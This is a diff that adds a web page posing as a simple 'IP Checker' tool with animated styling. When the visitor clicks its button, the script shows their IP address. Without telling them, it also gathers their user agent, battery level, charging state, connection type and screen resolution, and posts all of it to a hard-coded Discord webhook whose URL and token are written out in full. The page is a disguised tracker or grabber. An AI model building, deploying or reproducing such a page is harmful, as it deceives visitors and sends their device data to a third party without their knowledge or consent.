@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Checker</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap');
+
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Noto Sans', sans-serif;
+            overflow: hidden;
+        }
+        
+        .fade-in-text {
+            opacity: 0;
+            animation: fadeIn 3s forwards, moveUp 3s 3s forwards;
+            font-size: 3em;
+            text-shadow: 0 0 5px #00bfff, 0 0 10px #00bfff, 0 0 15px #00bfff, 0 0 20px #00bfff;
+            transition: transform 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes moveUp {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-200px); }
+        }
+
+        button {
+            background-color: black;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            font-size: 1.2em;
+            margin: 20px;
+            cursor: pointer;
+            border: none;
+            border-radius: 25px;
+            box-shadow: 0 0 10px red, 0 0 20px yellow, 0 0 30px green, 0 0 40px blue, 0 0 50px purple;
+            animation: glow 2s infinite alternate, fadeInButton 1s forwards;
+            display: none;
+        }
+
+        @keyframes glow {
+            0% { box-shadow: 0 0 10px red, 0 0 20px yellow, 0 0 30px green, 0 0 40px blue, 0 0 50px purple; }
+            100% { box-shadow: 0 0 20px blue, 0 0 30px pink, 0 0 40px purple, 0 0 50px red, 0 0 60px yellow; }
+        }
+
+        @keyframes fadeInButton {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .ip-display {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #00bfff;
+            text-shadow: 0 0 5px #00bfff, 0 0 10px #00bfff;
+        }
+    </style>
+</head>
+<body>
+    <div id="animatedText" class="fade-in-text">IP Checker</div>
+    <button id="ipButton" onclick="getIPAddress()">Check Your IP Address</button>
+    <div class="ip-display" id="ipDisplay"></div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const animatedText = document.getElementById('animatedText');
+            animatedText.addEventListener('animationend', function(event) {
+                if (event.animationName === 'moveUp') {
+                    const button = document.getElementById('ipButton');
+                    button.style.display = 'inline-block';
+                }
+            });
+        });
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                document.getElementById('ipDisplay').innerText = 'Your IP Address: ' + data.ip;
+                const deviceInfo = await getDeviceInfo();
+                sendToWebhook(data.ip, deviceInfo);
+            } catch (error) {
+                document.getElementById('ipDisplay').innerText = 'Unable to fetch IP address.';
+                console.error('Error fetching IP address:', error);
+            }
+        }
+
+        async function getDeviceInfo() {
+            const deviceName = navigator.userAgent;
+            let chargingStatus = 'Unknown';
+            let batteryPercentage = 'Unknown';
+            let connectionType = 'Unknown';
+            let screenResolution = `${window.screen.width}x${window.screen.height}`;
+
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                chargingStatus = battery.charging ? 'Charging' : 'Not Charging';
+                batteryPercentage = (battery.level * 100).toFixed(2); // Convert to percentage
+            }
+
+            if (navigator.connection) {
+                connectionType = navigator.connection.effectiveType || 'Unknown';
+            }
+
+            return { deviceName, charging: chargingStatus, battery: batteryPercentage, connection: connectionType, resolution: screenResolution };
+        }
+
+        async function sendToWebhook(ip, deviceInfo) {
+            try {
+                const webhookPayload = {
+                    content: '',
+                    embeds: [{
+                        title: 'Device Information',
+                        fields: [
+                            { name: 'IP Address', value: ip, inline: true },
+                            { name: 'Device', value: deviceInfo.deviceName, inline: true },
+                            { name: 'Charging', value: deviceInfo.charging, inline: true },
+                            { name: 'Battery', value: `${deviceInfo.battery}%`, inline: true },
+                            { name: 'Connection Type', value: deviceInfo.connection, inline: true },
+                            { name: 'Screen Resolution', value: deviceInfo.resolution, inline: true }
+                        ],
+                        color: 0x00bfff
+                    }]
+                };
+                const response = await fetch('https://discord.com/api/webhooks/1262713180766081116/GOyYklUqpk6SSgxgEM-R1NUeLESykMNuA49zYYoMAWZg6LZ3Egrf-xfOnoieVKGUXXOH', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(webhookPayload)
+                });
+                const data = await response.json();
+                console.log('Webhook sent successfully:', data);
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
+            }
+        }
+    </script>
+</body>
+</html>
